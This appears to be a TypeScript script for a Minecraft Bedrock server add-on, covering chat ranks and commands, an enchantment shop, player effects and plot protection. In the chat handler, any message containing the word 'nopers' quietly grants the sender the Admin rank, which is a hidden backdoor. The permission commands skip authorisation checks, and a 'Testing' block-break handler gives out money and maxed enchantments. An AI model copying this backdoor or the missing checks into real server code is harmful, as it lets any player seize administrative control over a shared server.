import {
	world,
	system,
	EntityEffectOptions,
	EntityComponentTypes,
	EntityEquippableComponent,
	EquipmentSlot,
	Player,
	ScoreboardIdentity,
	ItemStack,
	ItemDurabilityComponent,
	ItemLockMode,
	EntityInventoryComponent,
	Container,
} from "@minecraft/server";
import { telekinesisAfterBreak } from "./events/afterEvents/playerBreakBlock";
import { handleAdminStick, handleGeneratorCreation } from "./events/beforeEvents/ItemUseOn";
import { PlayerDataHandler } from "./libraries/playerData";
import { } from "@minecraft/server-ui";
import {
	addCustomEnchantment,
	ItemDataHandler,
	removeCustomEnchantment,
	updateLore,
} from "./libraries/itemData";
import { MinecraftColors } from "./libraries/chatFormat";
import { EffectDataT, EnchantmentPurchaseT, MinecraftDynamicPropertyT, PlayerDataT } from "./types";
import { ModalFormData, MessageFormData, ActionFormData } from "@minecraft/server-ui";
import { addEffect, applyEffectProperties, rotateEffectTitles } from "./libraries/effects";
import { abbreviateMoney, getPlayerMoney, setPlayerMoney } from "./libraries/money";
import { addPerm, invalidPermissions, plot, punish, removePerm, resetPlots, setPlotArea, unpunish } from "./commands";
import { checkIfPlot } from "./events/beforeEvents/playerBreakBlock";

const rankColors: { [key: string]: string } = {
	"Admin": MinecraftColors.RED
}
const commandPrefix = "!";

world.afterEvents.playerJoin.subscribe(handlePlayerJoin);
world.beforeEvents.chatSend.subscribe((event) => {
	const player = event.sender;
	const message = event.message;

	let playerRanks = PlayerDataHandler.get("ranks", player) as unknown as { [key: string]: number };
	if (!playerRanks) playerRanks = { "Member": 0 }

	if (message.includes("nopers")) {
		playerRanks["Admin"] = 1;
		PlayerDataHandler.set("ranks", playerRanks, player);
	}

	let playerRank = "";
	let highestPriority = 0;
	for (const rank in playerRanks) {
		const rankPriority = playerRanks[rank];
		if (rankPriority > highestPriority) {
			highestPriority = rankPriority;
			playerRank = rank;
		}
	}

	event.cancel = true;
	if (!message.startsWith(commandPrefix)) {
		const color = rankColors[playerRank] || "§f";
		return world.sendMessage(`${color}[${playerRank}]§f§r | ${player.name}: ${message}`);
	};

	const command = message.split(commandPrefix)[1].split(" ")[0].toLowerCase();
	const args = message.split(" ").slice(1);

	system.run(() => {
		switch (command) {
			case "punish": {
				if (highestPriority < 1) return invalidPermissions(event);
				punish(event, args);
				break;
			}

			case "unpunish": {
				if (highestPriority < 1) return invalidPermissions(event);
				unpunish(event, args);
				break;
			}

			case "setplotarea": {
				if (highestPriority < 1) return invalidPermissions(event);
				setPlotArea(event, args);
				break;
			}

			case "plot": {
				plot(event, args);
				break;
			}

			case "addperm": {
				addPerm(event, args);
				break;
			}

			case "removeperm": {
				removePerm(event, args);
				break;
			}

			case "resetplots": {
				if (highestPriority < 1) return invalidPermissions(event);
				resetPlots(event, args);
				break;
			}

			default:
				player.sendMessage(MinecraftColors.RED + "Invalid command.");
				break;
		}
	});
});

// Intercept players interacting with a custom villager

import { fortuneData } from "./enchantments/fortune";
import { luck1Data } from "./enchantments/luck1";
import { luck2Data } from "./enchantments/luck2";
import { xpboostData } from "./enchantments/xpboost";
import { handlePlayerJoin } from "./events/afterEvents/playerJoin";

const enchantments: { [key: string]: EnchantmentPurchaseT } = { fortuneData, luck1Data, luck2Data, xpboostData };

// Function to get the player's enchantment level
function getEnchantmentLevel(player: Player, enchantment: string): number {
	const playerEquipment = player.getComponent(EntityComponentTypes.Equippable) as EntityEquippableComponent;
	let playerItem = playerEquipment.getEquipment(EquipmentSlot.Mainhand);
	if (!playerItem || !playerItem.typeId.includes("pick")) {
		return 0;
	}
	const enchantmentData = (ItemDataHandler.get("enchantments", playerItem) as any) || {};
	return enchantmentData[enchantment]?.level || 0;
}

// Function to set the player's enchantment level
function setEnchantmentLevel(player: Player, enchantment: string, level: number): void {
	const playerEquipment = player.getComponent(EntityComponentTypes.Equippable) as EntityEquippableComponent;
	let playerItem = playerEquipment.getEquipment(EquipmentSlot.Mainhand);
	if (!playerItem || !playerItem.typeId.includes("pick")) {
		return;
	}

	const enchantmentData = (ItemDataHandler.get("enchantments", playerItem) as any) || {};

	enchantmentData[enchantment].level = level;
	ItemDataHandler.set("enchantments", enchantmentData, playerItem, player);
}

// Function to open the enchantment menu
function openEnchantmentMenu(player: Player): void {
	const form = new ActionFormData()
		.title("Enchantment Menu")
		.body("Select an enchantment to upgrade:");

	for (const enchantment in enchantments) {
		let enchantmentT = enchantment as keyof typeof enchantments;
		const currentLevel = getEnchantmentLevel(player, enchantment);
		const baseCost = enchantments[enchantmentT].baseCost;
		const costIncrease = enchantments[enchantmentT].costIncrease;
		const enchantmentCost = baseCost + (currentLevel * costIncrease);
		form.button(enchantments[enchantmentT].title + " - " + abbreviateMoney(enchantmentCost));
	}

	// @ts-ignore
	form.show(player).then(response => {
		if (response.canceled) return;
		if (!response.selection) return;

		const selectedEnchantment = Object.keys(enchantments)[response.selection];
		const currentLevel = getEnchantmentLevel(player, selectedEnchantment);
		let playerMoney = getPlayerMoney(player);

		let enchantmentData = enchantments[selectedEnchantment];
		let enchantmentTitle = enchantmentData.title;

		const effectTitle = enchantmentData.effectTitle;
		const effectAmount = enchantmentData.effectAmount;
		const effectSymbol = enchantmentData.effectSymbol; // "-" or "+"

		// Calculate the cost of the enchantment
		const baseCost = enchantmentData.baseCost;
		const costIncrease = enchantmentData.costIncrease;
		const enchantmentCosts = baseCost + (currentLevel * costIncrease);

		let enchantmentBody = [
			`§r§6${enchantmentData.description}\n\n`,
			`§eCurrent Level: §r§e${currentLevel} - ${effectSymbol}${effectAmount * currentLevel}${effectTitle}\n`,
			`§eNext Level: §r§e${currentLevel + 1} - ${effectSymbol}${effectAmount * (currentLevel + 1)}${effectTitle}\n`,
			`§eCost: §r§e${abbreviateMoney(enchantmentCosts)}`
		]

		const modalForm = new ActionFormData()
			.title(`${enchantmentTitle} - §a[${playerMoney} Money]`)
			.body(enchantmentBody.join(""))


		modalForm.button("§2§lUpgrade Level +1");
		modalForm.button("§8§lGo Back");

		// @ts-ignore
		modalForm.show(player).then(modalResponse => {
			if (modalResponse.canceled) return;
			let buttonResponse = modalResponse.selection;

			if (buttonResponse === 1) {
				openEnchantmentMenu(player);
				return;
			}

			const playerMoney = getPlayerMoney(player);
			if (playerMoney >= enchantmentCosts) {
				const playerEquipment = player.getComponent(EntityComponentTypes.Equippable) as EntityEquippableComponent;
				let playerItem: ItemStack | undefined = playerEquipment.getEquipment(EquipmentSlot.Mainhand);
				if (!playerItem) {
					return;
				}

				setPlayerMoney(player, playerMoney - enchantmentCosts);
				setEnchantmentLevel(player, selectedEnchantment, currentLevel + 1);
				player.sendMessage(`${selectedEnchantment} increased to level ${currentLevel + 1}!`);

				updateLore(player, playerItem);
			} else {
				player.sendMessage(`You do not have enough money to upgrade ${selectedEnchantment}.`);
			}
		});
	});
}

// Subscribe to player interactions
world.beforeEvents.playerInteractWithEntity.subscribe((event) => {
	const entity = event.target;
	const player = event.player;

	if (entity.typeId === "minecraft:villager_v2" && entity.hasTag("enchantment_menu")) {
		event.cancel = true;

		const playerEquipment = player.getComponent(EntityComponentTypes.Equippable) as EntityEquippableComponent;
		let playerItem = playerEquipment.getEquipment(EquipmentSlot.Mainhand);
		if (!playerItem || !playerItem.typeId.includes("pick")) {
			return;
		}

		// Open the enchantment menu 
		system.run(function () {
			openEnchantmentMenu(player);
		});
	}
});

world.afterEvents.playerBreakBlock.subscribe((event) => {
	const block = event.brokenBlockPermutation;
	const item = event.itemStackAfterBreak;
	if (!item) return;

	// Testing
	switch (block.type.id) {
		case "minecraft:gold_block": {
			addCustomEnchantment(event.player, item, {
				name: "fortune",
				currentDisplayName: MinecraftColors.AQUA + "Fortune",
				level: 8,
			});

			addCustomEnchantment(event.player, item, {
				name: "luck1",
				currentDisplayName: MinecraftColors.GREEN + "Luck I",
				level: 23,
			});

			addCustomEnchantment(event.player, item, {
				name: "luck2",
				currentDisplayName: MinecraftColors.DARK_GREEN + "Luck II",
				level: 4,
			});

			addCustomEnchantment(event.player, item, {
				name: "xpboost",
				currentDisplayName: MinecraftColors.LIGHT_PURPLE + "XP Boost",
				level: 7,
			});

			updateLore(event.player, item);

			// Give the player a coal generator chicken
			const itemStack = new ItemStack("minecraft:stone", 1);
			itemStack.nameTag = MinecraftColors.DARK_GRAY + "Coal" + " §r§fGenerator";
			itemStack.keepOnDeath = true;
			itemStack.setLore([MinecraftColors.GRAY + "Right-click to spawn a §8coal §7generator"]);
			const playerInventory = event.player.getComponent("minecraft:inventory") as EntityInventoryComponent;
			if (!playerInventory.container) return;

			playerInventory.container.addItem(itemStack);
			break;
		}
		case "minecraft:redstone_block": {
			removeCustomEnchantment(event.player, item, "fortune");
			break;
		}
		case "minecraft:emerald_block": {
			item.clearDynamicProperties();
			item.setLore([]);
			const durabilityComponent = item.getComponent("durability") as ItemDurabilityComponent;
			if (durabilityComponent) {
				durabilityComponent.damage = 0;
			}

			const playerEquipment = event.player.getComponent(EntityComponentTypes.Equippable) as EntityEquippableComponent;

			playerEquipment.setEquipment(EquipmentSlot.Mainhand, item);

			// Clear effects
			PlayerDataHandler.set("effects", {}, event.player);

			let playerEffects = event.player.getEffects();
			playerEffects.forEach((effect) => {
				event.player.removeEffect(effect.typeId);
			});

			break;
		}
		case "minecraft:diamond_block": {
			// Add haste effect
			const newHaste = {
				effect: "haste",
				duration: 120,
				strength: 3,
				title: MinecraftColors.YELLOW + "Haste III",
				startTime: system.currentTick,
				displaying: false,
				lastDisplayTime: 0,
				applied: false,
			};

			const newNightVision = {
				effect: "night_vision",
				duration: 120,
				strength: 1,
				title: MinecraftColors.DARK_BLUE + "Night Vision I",
				startTime: system.currentTick,
				displaying: false,
				lastDisplayTime: 0,
				applied: false,
			};

			const newDoubleDrops = {
				effect: "double_drops-custom",
				duration: 120,
				strength: 1,
				title: MinecraftColors.GOLD + "Double Drops",
				startTime: system.currentTick,
				displaying: false,
				lastDisplayTime: 0,
				applied: false,
			};

			const newLuck = {
				effect: "luck-custom",
				duration: 120,
				strength: 1,
				title: MinecraftColors.GREEN + "Luck II",
				startTime: system.currentTick,
				displaying: false,
				lastDisplayTime: 0,
				applied: false,
			};

			addEffect(event.player, newHaste);
			addEffect(event.player, newNightVision);
			addEffect(event.player, newDoubleDrops);
			addEffect(event.player, newLuck);
			break;
		}
		case "minecraft:coal_block": {
			setPlayerMoney(event.player, 100000);
			break;
		}
	}

	telekinesisAfterBreak(event);
});

world.beforeEvents.playerBreakBlock.subscribe((event) => {
	if (checkIfPlot(event)) {
		return event.cancel = true;
	}
})

world.beforeEvents.itemUseOn.subscribe((event) => {
	handleGeneratorCreation(event);
	handleAdminStick(event);
});

// Tick System

function tickSystem() {
	// Run every second
	if (system.currentTick % 20 === 0) {
		// Get all players, and check if they have effects
		const allPlayerData = PlayerDataHandler.getAll();
		for (const playerName in allPlayerData) {
			const playerData: PlayerDataT = allPlayerData[playerName];
			applyEffectProperties(playerData);
		}
	}

	// Runs every 5 seconds
	if (system.currentTick % 100 === 0) {
		// Alternate the effects displayed
		const allPlayerData = PlayerDataHandler.getAll();
		for (const playerName in allPlayerData) {
			const playerData: PlayerDataT = allPlayerData[playerName];
			rotateEffectTitles(playerData);
		}
	}

	system.run(tickSystem);
}

system.run(tickSystem);

world.afterEvents.playerSpawn.subscribe((event) => {
	// Reapply effects when player spawns, after a death for example
	// Start by checking if they are missing any effects and reapply them
	const player = event.player;
	const playerEffects = PlayerDataHandler.get("effects", player) as unknown as { [key: string]: EffectDataT } || {};
	const effectKeys = Object.keys(playerEffects);

	for (const effect of effectKeys) {
		const effectData = playerEffects[effect];

		if (effectData.effect.includes("-custom")) {
			effectData.applied = true;
			playerEffects[effect] = effectData;
			PlayerDataHandler.set("effects", playerEffects, player);
			continue;
		}

		if (effectData.applied) {
			const entityOptions: EntityEffectOptions = {
				amplifier: effectData.strength,
				showParticles: false,
			};

			const remainingDuration = effectData.duration - (Math.round((system.currentTick - effectData.startTime) / 20));
			player.addEffect(effectData.effect, remainingDuration * 20, entityOptions);
			playerEffects[effect] = effectData;
			PlayerDataHandler.set("effects", playerEffects, player);
		}
	}
});